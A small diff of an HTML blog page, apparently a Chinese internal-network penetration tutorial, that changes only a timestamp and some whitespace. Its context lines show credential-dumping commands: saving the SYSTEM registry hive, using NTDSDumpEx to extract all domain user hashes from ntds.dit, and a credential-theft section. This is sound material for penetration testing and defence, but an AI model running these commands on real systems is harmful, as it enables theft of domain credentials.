@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://example.com/images/image-20210116105039417.png">
 <meta property="og:image" content="http://example.com/images/image-20210116105528377.png">
 <meta property="article:published_time" content="2021-03-02T08:18:03.000Z">
-<meta property="article:modified_time" content="2021-03-26T00:52:11.512Z">
+<meta property="article:modified_time" content="2021-03-26T06:40:34.709Z">
 <meta property="article:author" content="h00ls">
 <meta property="article:tag" content="内网渗透专栏">
 <meta name="twitter:card" content="summary">
@@ -588,8 +588,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br></pre></td></tr></table></figure>
 <p>使用NTDSDumpEx获取所有域用户的hash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>
-
-
 <h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>如果目前只是获得的域中某个主机的工作组账户，如果想要进如域环境中，可以通过窃取域用户的凭证从而实现。</p>
 <p>查看当前的任务是否由域用户凭证</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>
@@ -678,6 +676,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -c topconns</span><br></pre></td></tr></table></figure>
 <p>查看网络带宽占用最多的进程</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -c topprocs_net</span><br></pre></td></tr></table></figure>
+<p>..</p>
 
         </div>
         
